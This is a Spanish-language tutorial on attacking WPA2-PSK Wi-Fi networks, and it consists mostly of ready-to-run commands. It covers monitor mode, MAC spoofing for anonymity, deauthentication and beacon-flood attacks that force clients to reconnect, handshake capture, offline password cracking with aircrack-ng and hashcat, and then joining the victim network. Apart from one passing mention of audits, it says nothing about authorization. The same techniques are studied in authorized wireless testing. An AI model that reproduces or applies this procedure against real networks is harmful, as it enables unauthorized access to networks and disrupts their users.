# WPA2 PSK - Handshake y Cracking

WPA2-PSK (Pre-Shared Key) es el protocolo de seguridad más común en redes domésticas y PYMES. La autenticación se basa en un handshake de 4 vías (4-Way Handshake) que ocurre cada vez que un cliente se conecta al AP.

```
      Cliente                         AP (Router)
         │                               │
         │──── [1] ANonce ──────────────→│  AP envía número aleatorio (ANonce)
         │                               │
         │←─── [2] SNonce + MIC ─────────│  Cliente responde con su nonce (SNonce)
         │                               │  y un Message Integrity Code
         │                               │
         │──── [3] GTK + MIC ───────────→│  AP envía la clave de grupo (GTK)
         │                               │
         │←─── [4] ACK ──────────────────│  Cliente confirma
         │                               │
         └──── CONEXIÓN ESTABLECIDA ─────┘

El PTK (Pairwise Transient Key) se deriva de:
PTK = PRF(PMK + ANonce + SNonce + MAC_AP + MAC_Cliente)
PMK = PBKDF2(Contraseña + SSID)

→ Si capturamos los mensajes 1-4 del handshake,
  podemos intentar crackear la contraseña offline
```

### Preparación del entorno

```bash
# 1. Verificar la interfaz Wi-Fi
iwconfig
ip link show

# 2. Eliminar procesos que interfieren
airmon-ng check kill

# 3. Activar modo monitor
airmon-ng start wlan0
# La interfaz se renombra a wlan0mon

# Verificar modo monitor
iwconfig wlan0mon   # debe mostrar Mode:Monitor

# 4. (Opcional) Cambiar MAC para anonimato
ip link set wlan0mon down
macchanger -r wlan0mon
ip link set wlan0mon up
```

### Paso 1 — Reconocimiento de redes

```bash
# Escanear todas las redes del entorno
airodump-ng wlan0mon

# Columnas clave a observar:
# BSSID  → MAC del AP
# PWR    → Potencia señal (-30 excelente, -70 débil, -90 fuera de rango)
# #Data  → Paquetes de datos (indica actividad y clientes activos)
# CH     → Canal (1-14 en 2.4GHz, 36-165 en 5GHz)
# ENC    → Cifrado: OPN / WEP / WPA / WPA2 / WPA3
# AUTH   → PSK (personal) o MGT (enterprise)
# ESSID  → Nombre de la red

# Sección inferior (STATIONs):
# STATION → MAC del cliente conectado
# BSSID   → AP al que está conectado
# Probes  → Redes que el cliente busca activamente

# Para escanear también 5 GHz:
airodump-ng wlan0mon --band a
# Ambas bandas:
airodump-ng wlan0mon --band abg
```

### Paso 2 — Focalizar en el objetivo

```bash
# Una vez identificada la red objetivo:
airodump-ng wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    -w handshake_captura \
    --output-format pcap

# Parámetros:
# --bssid   → BSSID del AP objetivo
# --channel → Canal del AP (fijar el canal mejora la captura)
# -w        → Prefijo del archivo de salida
# El archivo generado: handshake_captura-01.cap

# Dejar esta terminal abierta y esperar a que aparezca:
# [ WPA handshake: AA:BB:CC:DD:EE:FF ]
# en la esquina superior derecha de airodump-ng
```

### Paso 3 — Capturar el Handshake

#### Método A — Espera pasiva

Si hay clientes conectados con actividad, el handshake se captura cuando:

* Un cliente se desconecta y reconecta voluntariamente
* El AP envía un nuevo handshake por inactividad
* El cliente renueva la sesión

```bash
# Simplemente esperar con airodump-ng corriendo
# Puede tardar minutos u horas dependiendo de la actividad
# Útil en entornos donde el ruido debe ser mínimo
```

#### Método B — Deauthentication (activo, recomendado)

Enviar paquetes de desautenticación fuerza a los clientes a reconectarse, generando un nuevo handshake.

```bash
# Abrir SEGUNDA terminal

# Deauth global — todos los clientes del AP
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 → tipo de ataque: deauthentication
# 5  → número de paquetes deauth (0 = infinito)
# -a → BSSID del AP objetivo

# Deauth dirigido — un cliente específico (menos ruidoso)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# -c → MAC del cliente objetivo (de la lista de STATIONs)

# Deauth continuo hasta capturar el handshake (con precaución)
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# Cuando veas el handshake en airodump-ng → Ctrl+C

# Volver a Terminal 1 y verificar:
# [ WPA handshake: AA:BB:CC:DD:EE:FF ] → capturado ✅
```

#### Método C — Deauth con mdk4 (más agresivo)

```bash
# mdk4 puede generar deauth masivo de forma más efectiva
# SOLO si el método A/B no funciona

# Deauth masivo en el canal
mdk4 wlan0mon d -c 6 -b lista_bssid.txt
# Crear lista_bssid.txt con el BSSID del AP objetivo

# Beacon flood (confunde al cliente para reconectar)
mdk4 wlan0mon b -n "NombreRedObjetivo" -c 6
```

### Paso 4 — Verificar el handshake capturado

```bash
# Método 1: aircrack-ng (verificación rápida)
aircrack-ng handshake_captura-01.cap
# Output esperado:
# 1 handshake → AA:BB:CC:DD:EE:FF → NombreRed

# Si muestra "No valid WPA handshakes found" → repetir la captura

# Método 2: Wireshark (verificación detallada)
wireshark handshake_captura-01.cap
# Filtro: eapol
# Debe haber 4 paquetes EAPOL (mensajes 1, 2, 3, 4)
# Los mensajes 2 y 4 son los que permiten crackear
# Mínimo necesario: mensajes 1+2 o 2+3

# Método 3: cowpatty
cowpatty -r handshake_captura-01.cap -c
# "valid 4-way handshake" → handshake completo ✅
# "incomplete 4-way handshake" → repetir captura

# Método 4: pyrit
pyrit -r handshake_captura-01.cap analyze
```

### Paso 5 — Convertir al formato de hashcat

```bash
# hashcat usa su propio formato (.22000 para WPA o .hccapx legacy)

# Método recomendado: hcxtools
hcxpcapngtool -o hash.22000 handshake_captura-01.cap

# Verificar que el hash se generó correctamente
cat hash.22000
# Debe mostrar líneas con formato:
# WPA*02*HASH*BSSID*CLIENTMAC*ESSID*...

# Método alternativo (formato .hccapx — legacy)
hcxpcaptool -z hash.hccapx handshake_captura-01.cap

# Si hcxtools no está disponible:
cap2hccapx handshake_captura-01.cap hash.hccapx
```

### Paso 6 — Cracking con aircrack-ng (CPU)

```bash
# Ataque por diccionario básico
aircrack-ng handshake_captura-01.cap \
    -w /usr/share/wordlists/rockyou.txt

# Especificar el BSSID si hay varios handshakes en el archivo
aircrack-ng handshake_captura-01.cap \
    -w /usr/share/wordlists/rockyou.txt \
    -b AA:BB:CC:DD:EE:FF

# Wordlists específicas para Wi-Fi (más probabilidades de éxito)
aircrack-ng handshake_captura-01.cap \
    -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt

# Indicadores de progreso:
# KEY FOUND! [ contraseña ] → éxito ✅
# Passphrase not in dictionary → probar otra wordlist
```

### Paso 7 — Cracking con Hashcat (GPU — mucho más rápido)

```bash
# Modos de hashcat para WPA:
# -m 22000 → WPA-PBKDF2-PMKID+EAPOL (formato moderno, recomendado)
# -m 2500  → WPA/WPA2 (formato .hccapx, legacy)

# ===== ATAQUE POR DICCIONARIO =====
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# Con verbose para ver el progreso
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt -w 3

# Mostrar la contraseña si ya fue crackeada anteriormente
hashcat -m 22000 hash.22000 --show


# ===== ATAQUE CON REGLAS (expande el diccionario) =====
# Las reglas transforman cada palabra: mayúsculas, añadir números, leetspeak...

# best64.rule → 64 transformaciones comunes
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# dive.rule → reglas más exhaustivas (más lento pero más completo)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/dive.rule

# Combinar múltiples reglas
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -r /usr/share/hashcat/rules/toggles1.rule


# ===== ATAQUE POR MÁSCARA (fuerza bruta con patrón) =====
# Máscaras de hashcat:
# ?l = minúscula (a-z)
# ?u = mayúscula (A-Z)
# ?d = dígito (0-9)
# ?s = especial (!@#$...)
# ?a = cualquier carácter printable

# 8 dígitos (contraseñas telefónicas — muy comunes en routers)
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d

# 9 y 10 dígitos
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d?d
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d?d?d

# Patrón: Mayúscula + 5 minúsculas + 3 dígitos (típico de contraseñas "seguras")
hashcat -m 22000 hash.22000 -a 3 ?u?l?l?l?l?l?d?d?d

# Patrón: palabra + 4 dígitos
hashcat -m 22000 hash.22000 -a 3 ?l?l?l?l?l?l?d?d?d?d

# Rango de longitudes con increment
hashcat -m 22000 hash.22000 -a 3 --increment --increment-min 8 \
    --increment-max 12 ?a?a?a?a?a?a?a?a?a?a?a?a


# ===== ATAQUE DE COMBINACIÓN (dos diccionarios) =====
# Concatena palabras de dict1 con palabras de dict2
hashcat -m 22000 hash.22000 -a 1 nombres.txt numeros.txt
# Resultado: "Pedro123", "Maria2024", "Juan1990"...


# ===== WORDLIST BASADA EN EL OBJETIVO =====
# Generar wordlist personalizada con el nombre del SSID, empresa, ciudad...
cewl https://empresa.com -d 2 -m 5 > cewl_empresa.txt

# crunch para contraseñas con patrón conocido
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 \
    -t NombreRed@@@@ -o wordlist_custom.txt

# CUPP para contraseñas basadas en perfil personal (útil en auditorías)
python3 cupp.py -i
# Introduce nombre, fecha de nacimiento, mascota, etc.
# Genera wordlist específica


# ===== VERIFICAR RESULTADO =====
hashcat -m 22000 hash.22000 --show
# Si crackeado: HASH:CONTRASEÑA
```

### Conectarse a la red tras crackear

```bash
# Desactivar modo monitor y volver a modo managed
airmon-ng stop wlan0mon

# Conectar con la contraseña obtenida
nmcli dev wifi connect "NombreRed" password "ContraseñaEncontrada"

# O con wpa_supplicant
wpa_passphrase "NombreRed" "ContraseñaEncontrada" > /etc/wpa_supplicant.conf
wpa_supplicant -i wlan0 -c /etc/wpa_supplicant.conf -B
dhclient wlan0
```

### Troubleshooting frecuente

```bash
# Problema: "No valid WPA handshakes found"
# → Los paquetes EAPOL capturados están incompletos
# → Repetir la captura más cerca del AP
# → Asegurarse de que el cliente se reconecta (esperar el handshake completo)
# → Usar -c para dirigir el deauth al cliente específico más activo

# Problema: El cliente no se reconecta tras el deauth
# → El AP puede estar filtrando deauth frames (Management Frame Protection)
# → Probar con más paquetes: aireplay-ng -0 20 ...
# → Usar mdk4 para un ataque más intensivo

# Problema: hashcat dice "No hashes loaded"
# → El archivo .22000 está vacío o mal formado
# → Verificar con: cat hash.22000
# → Regenerar con hcxpcapngtool

# Problema: La tarjeta no inyecta paquetes
# Verificar inyección:
aireplay-ng -9 wlan0mon
# "Injection is working!" → funciona
# Si no: probar con el driver correcto o usar otra tarjeta

# Verificar que estás en el canal correcto:
iwconfig wlan0mon channel 6
```

> Hashcat con GPU es 100-1000x más rápido que aircrack-ng con CPU para el cracking. Si tienes GPU dedicada, siempre usar hashcat. En una GTX 1060 se pueden probar \~400.000 contraseñas/segundo contra WPA2.

> Las reglas de hashcat son más efectivas que tener una wordlist más grande. `best64.rule` sobre rockyou.txt prueba 64 variaciones de cada contraseña: con mayúsculas, números añadidos, caracteres especiales — multiplicando la cobertura por 64 sin aumentar el diccionario.

> Si el AP tiene Management Frame Protection (802.11w) activo, los paquetes de deauth serán ignorados. En ese caso usar el PMKID attack (que no requiere deauth) o Evil Twin para forzar la reconexión.
